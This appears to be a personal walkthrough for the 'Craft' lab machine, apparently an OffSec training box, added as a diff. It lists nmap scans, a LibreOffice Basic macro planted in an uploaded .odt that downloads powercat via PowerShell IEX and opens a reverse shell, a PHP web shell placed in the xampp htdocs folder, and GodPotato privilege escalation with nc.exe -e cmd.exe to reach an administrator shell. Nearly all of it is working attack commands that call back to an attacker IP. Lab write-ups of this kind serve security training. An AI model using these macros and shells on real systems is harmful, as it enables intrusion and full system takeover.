@@ -1,0 +1,105 @@
+Craft 
+
+192.168.104.169
+
+sudo nmap -Pn -n 192.168.136.169 -sC -sV -p- --open
+
+sudo nmap -Pn -n 192.168.136.169 -sU --top-ports=100
+
+domain craft.offsec
+
+access website 
+you can upload file .odt format only 
+We need to install libreoffice
+
+sudo apt install libreoffice
+
+open libreoffice 
+
+Go to Tools → Macros → Organize Macros → Basic
+
+Select your document (resume.odt)
+New > Give and name 
+
+Sub Main
+shell("cmd /c powershell iwr http://192.168.45.204/")
+End Sub
+
+Go back to your documents
+Recheck your macro hasbeen created or not
+
+Tools >customize>Events >Open Documents >
+Select macro you have created
+
+Remove old macro and assign new macro with following content
+
+
+Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.204/powercat.ps1');powercat -c 192.168.45.204 -p 135 -e powershell")
+
+start Web server "Where we have powercat.ps1" 
+python -m http.server 80
+ nc -nvlp 135  
+ 
+ C:\users\thecybergeek\Desktop
+ cat local.txt 
+ 
+ 
+ 
+ Transfer winp.exe
+ 
+ iwr http://192.168.45.204/winp.exe -outfile winp.exe
+ 
+go cd C:\xampp\htdocs
+This is writable directory 
+Transfer reverse_shell.php in this dirctory then get back one more more shell with apache user (ivan Shell)
+trigger the revshell.php from the browser
+
+C:\xampp\htdocs>whoami /priv
+apache user
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeTcbPrivilege                Act as part of the operating system       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+
+Our Target 
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+
+https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer
+
+download god potato
+https://github.com/BeichenDream/GodPotato/releases
+
+before download gopotato check dotnet version using following commnand
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+
+It s net4
+download and transfer god potato to victim machine
+
+cp ~/Downloads/GodPotato-NET4.exe .
+on victime machine 
+iwr http://192.168.45.204/GodPotato-NET4.exe -outfile GodPotato-NET4.exe
+.\GodPotato-NET4.exe -cmd "whoami" (apache user shell)
+I can run command as administrator
+
+transfer nc.exe to victim
+iwr http://192.168.45.204/nc.exe -outfile nc.exe
+nc -nvlp 808 (Attacker machine)
+.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.204 808  -e c:\windows\system32\cmd.exe"
+
+Got admin shell
+
+
+
+
+
+.\GodPotato-NET4.exe -cmd ".\nc.exe 192.168.45.204 808  -e c:\windows\system32\cmd.exe"
